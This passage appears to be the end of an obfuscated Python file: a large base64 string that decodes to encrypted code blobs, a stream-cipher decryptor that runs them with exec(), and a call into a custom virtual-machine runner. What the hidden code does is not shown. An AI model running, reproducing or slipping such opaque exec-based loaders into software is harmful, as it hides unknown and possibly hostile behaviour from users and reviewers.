VjZ2h4OEFGczc2bU5CcktjMGMzRnlDWDM4K1YyckIrTW1wL0pnZ0ZWTWROTXVXSTNYWUpMY1drTW9OSVRmdDNaSHdFZWVFbUtHcFlsMmp1SXRIb092R2FBSU5yL2dlMmxza3pFeStmMVBqQUhnNjB4aTUvWnlCUXRTNjZvaWcyRE9BVVhoM0NMY2xkd0s3c09yTUJGQjJSK1RsOFNMRVdDTWhEVlJYZTBPU1hpb21GSS9ZdXlJdVJ6K1RncHhQdUp5MlRuYml3SnVSTW9vRm5IWDVrN2phQXF2Q251VHN3NUhWS1NlZGpTaFppREdGdmNIc093ejA1UkFFS1VubmxLblowSHBQaTRxQ29CYlk4TlFHSENWbW1WWXhkZEx2YytWYWlBcjNxbnprNkl1eXdsYTY2OVZOcCs3UVcySHJvWHFIdWdzWjZPSzdlYWtSaitXQXNYdnVDMlVDSStITkFtdDBUbXZQT211NC8zVnRQSzJ1alVzOGFjWHMyUWVGYVZieEpwdlhuTzhUWFl2K3Y2OW9DV2s3ZkR3QjFhMmUyM3g1Nmg5cDRPNDl5OUxqRmxSOFpTam1nNE9tVjQzMytIZnd3PT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnSk5iR3JINGZYREhyeENIVTRNdGlZbTQ1cXpRd0w5OFNOL0cwWFhmWDdGV3BGbzBnRlBsN2FIV1Zlb1JUN0ZObU9DU3MvQjZJYkJmSFphdlZEUkxCOFFMRnVpMzN3TjVTUnVBd2VQOUdvczNabFdpUnA5ZWtFbXFJQ2hZNVJTT3NCZjRjczJaaWkvYjNpSkFKTEZHRDRjbGRraGd2dUZLYU94MVppZll5VngwcXBuVFZwdzRMOURCYTNxY25iZGlqY0pHOUkzT1RzYkNvTi9jWEE4U2ZVczFnSi9sc2VqNGQraTlrQjV5TGJzdGF5OFBmZElOZDRhS1Z0RUVGMHdDWDViTDZUUXJaWmZ5MkZjQlNEZXRRWThTZUFlcEJ2dWlMNllwQnQ4d2dFSDZESjExdWdRZnN6Q3BUK01LTWxjajgzV3hpbFNCdzBmdjBGdm9VbjRnZjRGV2pxR3hReHN1UTBHd1RFQi9mY3krckRNTlB3VUt4SU9ldm9vak92MjJXcjJQcU5sRjRLeDN2aEdmMHRQdFpiNzNocVVhSThkODBVSkdvM1pTS0xlazlyS3AyVlBZak1hejc5aFR4UDA3UHJ2QVJxR1JrdU5HV3pZUjloZGRBMjVNOU90RGpOV0FnakNBSmZlbGdSdCtyOWkxeUZjZk83S1lHc3F5L3hyRzRjeFJPUGxZTFVremo3ekNBVTdteVpyTG83QVQ1Yjd4ZkNGMTF2TGM5MTlVVG0wWUNKdnluN3ZMWG5aTzRGbXZLekVvWUNZMEpzdFVCRklGWm9iaXEreml6a2dWaTFLTG1ZZVpRY2x5NWg4dUl5NWVSelVHSmNnbm42d2NmRlJPZXpXZjc4Y2ZreGQ4bkZWTFNYSXp4RzJ1UG1VSm1IUXRvQXEvSDVOdm1vOTJaQ1lObmhweU1ZaWZJcVQvSE05dGVNMzJDR1JNckJmdG94dEp2cmtjNTVRbkRBY0NWSUl3Ty9EaE9pUjJmV28wUk5FZFVlUTVONm9CUWU4Y21DemV0Qk9xRElaRkgyb1ltci9FSFNiMWRHN1lsR1FrV0N0SHBxOEVnM1ljdzFzQ2VsSTBPb1hXZEkzUjBtZDcxSzB5TVMvVFNqYWtRRjNZMmFoYjgzVFVVUVpGelFWK1JVb1Z6TUJHS3dSZkNIRlhhNUZTczZUZFJnd0RBQ3FiQ2dmdytkNnpsS3lWYkxINEhHTTFWTGhvYXNJTWtyMjRWeXhvQk1DeUFuSVE1YXgwMEowOEVESGFYNm5uVEdpWXlkcFJnL3UrbWtWNURXWjJPQ0t4MEk1MUtJNnNtOE93bmNQbVhWbE15NFlRT0xqUFduRTR0bTdxMkxJRUZhTzBZR2Z3TGE4VmNuSkpSMkd0RmU2TVBwbmZyZWFZZlNTU28rNlg2b1YzeXhtZER2ak9iOW1rVURnWnRjcnVZV05jUWxaU2ZrUk55UjIyQ1pHYUtiR0g1aG9PejZQVHk2NlNUM096UzFuMjRwVGpWV2pDeWF5VGlaS2FxNDJodVBjeU5ScnNTT1ljZjRISFEyZGZiVXZMTDBLZnFKcDRRSHdmbXZ4OHdibm5qZ1IwaUJscHVaUnVDSkQ1Lzhtb0c5V09VdHUrbmxGSkZFRDk1d2QyN2I3cmNabEQ5NSs0SFAwMC9qNHdsL3dYR21RTGozRTBwVFd0Q1d2SEhVZ1l4VVlZZXdUaVFKUXlJNS9MbVFyM0I5NHQrak9CazdVcHRiUEl4ZkZjSGgzYW1BeForKy9PUU8vV3owYVBaR3VpT3JMRStEdmRGU2NxbjQrQ2pzeWxRbmNVc1FxYU12Z04vaC9NT3BBbHVqaEE4TnNuZlZOODBONVN6SUxXMS9aMVZ4UHFVUE9acEZhVDl5ai84eVplcTRzRkpraHhkN1Nuc2paZWRTRERUYU5ldEdHa0x3TVB3d1hIaDV2MVU2WW1ZMUFEQU1kNWJDRWV3d2JKQWd5RGFSdWdoU2IvTmZmNVQzOGxkKy9kM2MxNHpnVjdPQ3QzUWlwYklEb1puN2dTTkY4WENEajU1Rm1TdjRQN216U2w4anltWnZ1bVAwUU9lK045MVlhdzdONTV1UTd5dzNuWmhxY2tOK3AvQ3pXbGp4bDRzRzlwNXJiL3Q2WSthK1dtbmRDVERFbmwwSU5DdnZsQzlBczdKV25sTDBVZTVxTXdTS1dOY3Rvay8zTWpESWVYSmoxb0NqQmdxRnZOd1lkMTRzUnRxVEFQVUlQTk0zNEVUMGpjbjdJOStnMFl3eFZWaHpVaWRCeFVSTFJVUnNJMy9sczZ5NWFXdVpMUWwzZ01mQnFRN0V0LzVGNkFnTE5uZ1k5VmZ5TjdHNHpsQmtNalhxSllMaUhSNjVsaEdTV0Y5T1N3ZUZLSHAvZ3lTUUNCc3o0UWNIeThjckxWbzR2QTVCZVI0OFhnM0R5aW5KdVhwblo1ZWl6MlZ1R05wUDZ6Qmk1YnpTWlZKRDIreTlxU091S0Myb0xnQ2h1RjJlRjdVVGRuUkdNOXl3dGRJM2hiWUJlbUE1ZVhnU2psYUUra2ZjOC9meVZjS1hoL3FNVEdSK2pRTlh3QnFua2pBRG54Vk9vZHhLWW5mZE9YbkdKV3I0VDJVbDA1ajRCK1BQNjBzNkNleU9xSHZCdkcvN3hHdjhmVEVRKzVUUW9vdC9qOFpveHZiYWpvc2o4dEwnKSwgYmFzZTY0LmI2NGRlY29kZSgnRkpvUC9teURaUVRFS1ljZkNXVWh3Q2JoZnhKeFIzMy9jb3R3K1ZucktDN3dsNEhDSkMreUhwTlIxQzZaeFhYc1FhS3FSd2xKajF2TEJYdzc5UWlVRGRwVTNYMlhTbFdHMWV1bUlZeGg5ODV2aU1KMmpBdVhyWWxyODFodmwwNGN3OEFheXJJY2s0OUt2ckIzRjJiZE95K0NGTGEwcWZMZm9FYjU2M2N2WDJFU1dzTHYyNnl0MnpUVjIrd1hCRHF1L3BqNkdLbXI5Q2V3ZnJvenlkandnWllETUoxUjNTTEQrOGtJYy9rWnFSSW4wR3lHSXBwb1RVYURwanZVR1RTaG9OMFI1U1lOeGpYVGllOHVOaGloOCtRM2JCVndLMWtqaVFJNkt0d0lvV3NudTFLKzUwcDAvQ3lzWGFLSHNTUmtEOEZYV2tXNldiUW9JSjloMUJWUU9RYUgycGo5WDBZL3RRTEdDbDMxT25vTW45dzl4NVVDR3QyNHhQMkZMbkpTbXltOFYxTkRuUkZ0WnNiYXlQSHMrZzBiMXlKSjBuWDIrbTVVbmRjVnNYS0ttOEY1NjBZcTN2N2JRQnk3TXJCa0Zjb21wZjY0YXQ2aStkOEtpWFhSTWFpR2p3U1llU2tlZzhlVjMvZVJpRE5MNnQvR1ZQUEVBdUlML3pwVEpUT3BKampwRXhkZU5wZVBrZ0JZUHRWRnJVQVNlbzhLVEFKdkt4T3d2YVMxeWxrZTZSWEFSL1dLa3gxR0xqMjl2MHJRa1Z6NE1KQU5oVTFGd1FTazM3SHBNMk52NCt4OEwza3hiMlJ1MllNQVU1WVRqVnlPaUh6Wm95VFJQZ1Y4amx4Ui92Nzl2c0lKY1FlMFN6SGxERGlwUUtTUHF3NUxYYkh5WmZ0bTdkR3RsTFNPRWxpNHpXRnlURjNCU0p3NlRwR2ZrTXpsVHZnZ2VxWDlZM0VxMEtSWSt4WFJLMEVWWlNWVXNpaGlLL1VuWDFCdTZmY090NE8yT0RKS2xucEJVNzcyS2ttaGlTVVppMEJxSWZQbTJUbG1YVmF4ZXdrME03RnBVM3lJUjQ5bnlLZG1wK0xaTm9MT055akhBc0hvdzZZU245bkM3WWdSY0dxRXpLSlEzcTdQTlZWSk9nWW84UDg4b3ZNMGtUNHgrQWVxUTFxUCtKU0k5ZmNQUVU5dzNnQzNqejNta0NQeTZYMGFzb042eFFqS2VSTWZyMWhRUE81S3BZYXpNUlZvTGFYa0hya09ieEpObzlNaWFnVXZhSVBsdzNxUFFqaWlaVFB3OWZpZ3NpQWowWGhXNncxTWNHakFHNWNtaVlmS2RIR0IrS1dhTWtpNk81SE01TmFqYzJsZlZ0U1ZHZER6OS9paWhndGkycUhJZUE1NW1oczlkRzdMMHpacko4S0xLUGRrdFR5c1BnNnFNRFdnUnNwWWdXU2NUUkFLaHcyVlRJVUFLYlA0UjBURm5rQlNlam41MDBBSWVZWEllclVTMXpkQkZBOUhJWjdpUXNMcjlTWUxSSmxDb08weStTbkt4dE5DZlhKeXljc0pORFg4ems3b1BGZ1kyRERZVVZza2IrMmdYTDlHRVkyWDdSSWZXc01zYjBqc3VzK1VYVjFQMWVzUkF5TTRFM3d4K3NVbmhLWGZXMTIzU1Y0bVJOdy9qMWZ5ZjVQL0s5OXV0RkhOUE5pWHAxc0ZJTzBpcURtL3dFRTJFK1BQcVhmdGpVMmx1ZjAxOFF6L2paL08xN1JtVjZpTHB5bU9Md0Fjd1VrMkJGaTJHb3YvNDBEN3lxM3h0WVVDZ1FxMGVmSHNwR3ZGdzZUL2dpRkhIand6K25EazJLTFd1RlVTUWlQTFBMcDlOQVFWRm1IYkg2Y2xTVFlhWHpTQWNKWU9zcExHaTdQTjFLK2lRKytNbEY5T1ZFbWZ0Rmk2MUNaR3dTK1BQcUNvZ0VIdGRTU2IrckNlM1hvRjUxNG9ROFRiam1jbHNCQjZGRC82SnMrMCtGSTVrblFOUGdPOVRhRkZEbmdjYjR0MkdlT2RlNGhnV0dMTEM5R3FIY2oyUkRCVnJZUXFoc0hJT0xTNW56RVV0SnBENkFHK1U1aGhaYzdMRUZOYkVSNXZCNHcxUmNSR1gxRHoyVjR0YlZkQUlHd0dhK2w4U1d2czgwbzZvMzVCYytHSnJtWWJ6QzQveitPbkthK2RQYmlpTVdkQnFhMldqQmZmWnVQVUl2eU5MbnQ0bHVrdHRsZDY4MVBHNW1ZeTVkRFJndGdlT3gvUi9RY3ZZWGZ4UWl4Rk0vd1Frc1hpRjl4VFhqMmg1UjRTZnNwcERjK0d0SGNqNHUzTzNLcXVhVWlXQlRCN2dQc25ZZ1F6aTFnM0hjTUFBaDRBektuRFVpQmM3cXhSNmtlZGQ1dUpHWlptUDhKcHhNY2pwdUxNN2lvS3F4U2dkMXErUFNXbzlkZWdBY0FySEhaRXBFOUNnVE1xY3p3TGJ6bXN1Q2VCRVh6T2pMV3I5L2hBbldGSUsxU2RWZjJFMkNWRVI5N1VlMlFrdlZiV2EwZTlFelBlUll0ZnIzc3M5bmYycHhRTnhUcWprRUlmb1VDbno2ZEhVN3ljenN6ME9GVHp4V1lPRVBvRVB2NXY3U1M0OVV0ZXJlQzl6WkliYXdndVY3Mi9rMEU1Wi8wRURmQXVGNU5JTEFtVkprMD0nKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuYXBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZCgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZCcsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok)
if __name__ == '__main__':
    _wr()
